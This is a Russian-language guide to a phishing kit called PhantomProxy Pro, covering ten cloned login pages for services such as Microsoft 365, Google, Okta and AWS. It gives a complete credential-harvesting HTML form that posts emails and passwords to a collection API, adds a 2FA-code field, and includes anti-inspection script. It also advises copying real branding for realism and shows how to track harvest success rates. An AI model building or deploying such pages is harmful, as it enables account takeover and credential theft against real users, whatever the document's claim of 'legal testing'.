# 🎣 РАБОТА С ФИШЛЕТАМИ

**Полное руководство по созданию и использованию фишлетов в PhantomProxy Pro**

---

## 📖 ЧТО ТАКОЕ ФИШЛЕТ?

**Фишлет** — это шаблон фишинговой страницы, который имитирует настоящий сайт (Microsoft, Google, Okta, и т.д.) для сбора креденшалов в рамках легального тестирования.

---

## 🎯 ПРЕДУСТАНОВЛЕННЫЕ ФИШЛЕТЫ

PhantomProxy Pro включает **10 готовых фишлетов**:

| Фишлет | Сервис | Порт | Статус |
|--------|--------|------|--------|
| **Microsoft 365** | login.microsoftonline.com | 8443/microsoft | ✅ |
| **Google Workspace** | accounts.google.com | 8443/google | ✅ |
| **Okta SSO** | login.okta.com | 8443/okta | ✅ |
| **AWS Console** | aws.amazon.com | 8443/aws | ✅ |
| **GitHub** | github.com | 8443/github | ✅ |
| **LinkedIn** | linkedin.com | 8443/linkedin | ✅ |
| **Dropbox** | dropbox.com | 8443/dropbox | ✅ |
| **Slack** | slack.com | 8443/slack | ✅ |
| **Zoom** | zoom.us | 8443/zoom | ✅ |
| **Salesforce** | salesforce.com | 8443/salesforce | ✅ |

---

## 🚀 БЫСТРЫЙ СТАРТ

### 1. Запуск HTTPS Proxy

```bash
# В главном меню выберите: 1 (Start All Services)
python3 phantomproxy_v12_1_pro.py
```

### 2. Доступ к фишлету

Откройте в браузере:
```
https://212.233.93.147:8443/microsoft
```

### 3. Тестирование

Введите тестовые данные:
```
Email: test@company.com
Password: TestPassword123!
```

### 4. Проверка сессии

В главном меню выберите:
```
6. 📋 View Sessions
```

---

## ⚙️ НАСТРОЙКА ФИШЛЕТА

### Расположение файлов

```
~/phantom-proxy/templates/
├── microsoft_login.html
├── google_login.html
├── okta_login.html
├── aws_login.html
├── github_login.html
├── linkedin_login.html
├── dropbox_login.html
├── slack_login.html
├── zoom_login.html
└── salesforce_login.html
```

### Редактирование фишлета

```bash
# Откройте фишлет для редактирования
nano ~/phantom-proxy/templates/microsoft_login.html
```

### Пример кастомизации

```html
<!-- Добавьте свой логотип -->
<div class="logo">
    <img src="/branding/your-logo.png" alt="Your Company">
</div>

<!-- Измените заголовок -->
<h1>Вход в систему Your Company</h1>

<!-- Добавьте кастомный текст -->
<p class="subtitle">Введите данные для доступа к корпоративным ресурсам</p>
```

---

## 🔧 СОЗДАНИЕ СВОЕГО ФИШЛЕТА

### Шаг 1: Создание файла

```bash
cd ~/phantom-proxy/templates
nano custom_login.html
```

### Шаг 2: Базовая структура

```html
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в систему</title>
    <style>
        /* Добавьте ваши стили */
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            padding: 44px;
            border-radius: 5px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 440px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Вход в систему</h1>
        <form onsubmit="handleSubmit(event)">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Пароль</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn">Войти</button>
        </form>
    </div>
    
    <script>
        async function handleSubmit(e) {
            e.preventDefault();
            
            const data = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                service: 'Custom Service'
            };
            
            // Отправка данных в PhantomProxy
            await fetch('/api/v1/credentials', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            
            // Редирект после сбора
            window.location.href = 'https://example.com';
        }
    </script>
</body>
</html>
```

### Шаг 3: Интеграция с PhantomProxy

Откройте `phantomproxy_v12_1_pro.py` и добавьте маршрут:

```python
# В PanelServer class добавьте:
elif self.path == '/custom':
    self.show_custom_phishlet()

def show_custom_phishlet(self):
    template_path = Path(__file__).parent.parent / 'templates' / 'custom_login.html'
    with open(template_path, 'rb') as f:
        self.wfile.write(f.read())
```

---

## 🎨 КАСТОМИЗАЦИЯ

### Изменение цветовой схемы

```html
<style>
    .container {
        background: #1a1a2e;  /* Тёмный фон */
        color: #eee;           /* Светлый текст */
    }
    
    .btn {
        background: #e94560;   /* Ваш акцентный цвет */
    }
</style>
```

### Добавление логотипа

```html
<div class="logo">
    <img src="https://your-company.com/logo.png" alt="Your Company">
</div>
```

### Изменение текста

```html
<h1>Добро пожаловать в Your Company</h1>
<p class="subtitle">Введите учётные данные для продолжения</p>
```

### Добавление полей

```html
<div class="form-group">
    <label for="phone">Телефон</label>
    <input type="tel" id="phone" name="phone">
</div>

<div class="form-group">
    <label for="code">Код 2FA</label>
    <input type="text" id="code" name="code" maxlength="6">
</div>
```

---

## 📊 МОНИТОРИНГ ФИШЛЕТОВ

### Просмотр статистики

```bash
# В главном меню:
4. 📈 View Statistics
```

### Статистика по фишлетам

```python
from v12_analytics import AnalyticsDashboard

analytics = AnalyticsDashboard()
stats = analytics.get_service_breakdown(days=30)

for service in stats:
    print(f"{service['service']}: {service['count']} сессий, {service['success_rate']}% успех")
```

### Real-time мониторинг

```bash
# В главном меню включите уведомления:
8. ⚖️ Compliance Logs
```

---

## 🔐 БЕЗОПАСНОСТЬ ФИШЛЕТОВ

### Anti-Detect функции

```javascript
// В шаблоне фишлета
<script>
    // Блокировка F12
    document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey)) {
            e.preventDefault();
        }
    });
    
    // Блокировка выделения
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });
</script>
```

### SSL сертификаты

```bash
# Проверка SSL
openssl x509 -in ~/phantom-proxy/certs/cert.pem -text -noout

# Пересоздание сертификата
openssl req -x509 -newkey rsa:4096 \
  -keyout ~/phantom-proxy/certs/key.pem \
  -out ~/phantom-proxy/certs/cert.pem \
  -days 365 -nodes \
  -subj '/CN=verdebudget.ru/O=PhantomSec Labs/C=RU'
```

---

## 📈 BEST PRACTICES

### 1. Реалистичность

✅ Используйте оригинальные стили  
✅ Копируйте настоящие тексты  
✅ Добавьте favicon  
✅ Используйте правильные шрифты  

### 2. Производительность

✅ Минимизируйте CSS/JS  
✅ Используйте CDN для библиотек  
✅ Оптимизируйте изображения  
✅ Кэшируйте статику  

### 3. Безопасность

✅ Всегда используйте HTTPS  
✅ Регулярно обновляйте сертификаты  
✅ Логируйте все действия  
✅ Удаляйте данные после отчёта  

### 4. Тестирование

✅ Тестируйте на разных браузерах  
✅ Проверяйте мобильную версию  
✅ Тестируйте сбор данных  
✅ Проверяйте редирект  

---

## 🐛 TROUBLESHOOTING

### Фишлет не открывается

```bash
# Проверьте что сервис запущен
curl -sk https://localhost:8443/microsoft

# Проверьте логи
tail -f ~/phantom-proxy/https.log

# Перезапустите сервис
pkill -f https.py
cd ~/phantom-proxy
nohup python3 https.py > https.log 2>&1 &
```

### Данные не сохраняются

```bash
# Проверьте API
curl http://localhost:8080/health

# Проверьте базу данных
sqlite3 ~/phantom-proxy/phantom.db "SELECT * FROM sessions LIMIT 5;"

# Перезапустите API
pkill -f api.py
cd ~/phantom-proxy
nohup python3 api.py > api.log 2>&1 &
```

### SSL ошибка в браузере

```
Это нормально для self-signed сертификатов.
Нажмите "Advanced" → "Proceed to site"
```

---

## 📚 ДОПОЛНИТЕЛЬНЫЕ РЕСУРСЫ

- [API Documentation](./API.md)
- [Sessions Guide](./Sessions.md)
- [Reports Guide](./Reports.md)
- [Security Guide](./Security.md)

---

**© 2026 PhantomSec Labs. All rights reserved.**

**Last Updated:** February 20, 2026
